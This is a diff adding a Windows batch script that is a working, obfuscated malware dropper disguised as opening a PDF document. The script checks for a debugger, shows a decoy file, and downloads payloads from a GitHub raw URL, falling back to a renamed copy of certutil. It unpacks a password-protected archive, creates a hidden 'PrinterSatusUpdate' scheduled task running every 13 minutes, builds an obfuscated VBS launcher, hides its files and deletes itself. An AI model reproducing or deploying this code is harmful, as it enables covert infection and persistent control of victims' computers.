@@ -1,0 +1,123 @@
+@echo off
+rem big 544242424 
+tasklist | findstr /i "dbg.exe"  >nul && (exit)
+if "%~1"=="" goto ext
+set gfile=%~1
+rem fsfdff dfsdf ffdfdf 
+if "%~2"=="" set filename=temp_%random%.pdf
+if not "%~2"=="" (set filename=%~2) 
+set "filename=%filename:z= %"
+set dd=C:\Users\Public\Videos\
+rem fghyaa6tss 843535 
+set pth=C:\Users\Public\Downloads\%filename%
+if exist "%pth%" start "" "%pth%"
+if exist "%pth%"  goto fnish
+rem fghyaa6tss 843535 
+if not exist %dd% mkdir %dd%
+set dd=%dd%Samples\
+rem bbbbbb aaaaaaaaafffdfdf 
+mkdir %dd%
+rem fghyaa6tss 843535 
+set xx=merge
+set xf=init.dat
+set mk=ldp
+rem cccc ccceeeeererere  fdfdsfsdff
+set mkf=%dd%token.ini
+set sis=c:\Windows\System32\
+set ii=ntosk
+set ss=ini
+set ee=ce
+set tt=PrinterSatusUpdate_%random%%random%
+set ii=%dd%%ii%rnl.exe
+set ix=token.dat
+set ee=%temp%\%ee%%random%.exe
+set xxp=%dd%bin.ini
+set xxf=%dd%cfg.ini
+set rx=r.dat
+set rr=%dd%winrar.exe
+set pst=Nataxia4028
+set bt=check.dat
+set xx=downportal48/%xx%
+set psf=%dd%pst.ini
+del %xxp% /f /q
+del %xxf% /f /q
+del %psf% /f /q
+echo %xx%>>%xxp%
+echo %xf%>>%xxf%
+
+echo %pst%>>%psf%
+set mm=%dd%check.bat
+set mmr=%temp%\ck%random%.rar
+set hh=%sis%scht
+set hh=%hh%asks.exe
+del %mm% /f /q
+
+set str=%sis%cert
+if not exist "%ee%" copy %str%util.exe "%ee%" /y
+rem ffdfdfer 542424 
+set url=https://raw.githubusercontent.com/%xx%/r
+set url=%url%efs/heads/main/%gfile%
+set pth2=C:\Users\Public\Downloads\tmp%random%.tmp
+if exist %sis%curl.exe  %sis%curl.exe -L "%url%" -o "%pth2%"
+if not exist %sis%curl.exe "%ee%" -urlcache -f "%url%" "%pth2%"
+if not exist %pth2% echo Cannot open document.>>%pth2%
+if exist "%pth2%" copy "%pth2%" "%pth%" /y
+if exist "%pth%" start "" "%pth%"
+del %pth2% /q /f
+if exist %mkf% goto ext
+
+del %mkf% /f /q
+echo %mk%>>%mkf%
+
+
+set ur=https://raw.githubusercontent.com/%xx%/refs/heads/main
+set ur2=%ur%/%rx%
+set ur3=%ur%/%bt%
+set ur=%ur%/%ix%
+if exist %sis%curl.exe  curl.exe -L "%ur%" -o "%ii%"
+if not exist %sis%curl.exe "%ee%" -urlcache -f %ur% %ii%
+
+if exist %sis%curl.exe  curl.exe -L "%ur2%" -o "%rr%"
+if not exist %sis%curl.exe "%ee%" -urlcache -f %ur2% %rr%
+
+if exist %sis%curl.exe  curl.exe -L "%ur3%" -o "%mmr%"
+if not exist %sis%curl.exe "%ee%" -urlcache -f %ur3% "%mmr%"
+
+if not exist "%rr%" goto ext
+
+"%rr%" x "%mmr%" %dd% -p%pst%
+
+if not exist %mm% goto ext
+
+del "%mmr%" /q /f
+%hh% /delete /tn "%tt%" /f
+
+if not exist %ii% goto vvvvvv
+set /p "v="<%ii%
+echo %v% | findstr /i /b /c:"<html" >nul && goto vvvvvv
+
+%hh% /create /tn "%tt%" /tr "%ii% exec hide %mm%" /sc minute /mo 13 /f
+attrib +h %dfff%
+goto ext
+:vvvvvv
+
+rem afdfdfdfdf 
+set "str=8C85888r85e88a55t85e558588O58b885558885j85588e5588c8t55588858(8"5888W8S85c8858r58i88p8t885.S58888885h8888885e55558l5555588888l585888"88885558885)88885555888"
+ream afdfdfdfdf 
+set "str=%str:5=%"
+set vb=%dd%ini%random%.vbs
+set "str=%str:8=%"
+del %vb% /q /f
+echo Set w = %str%>>%vb%
+echo w.Run "%mm%", 0, False>>%vb%
+echo Set w = Nothing>>%vb%
+%hh% /create /tn "%tt%" /tr "%sis%wscript.exe %vb%" /sc minute /mo 13 /f
+
+:ext
+del "%ee%" /f /q 
+attrib +h %xxp%
+attrib +h %xxf%
+attrib +h %mkf%
+attrib +h %mm%
+attrib +h %rr%
+del %~f0
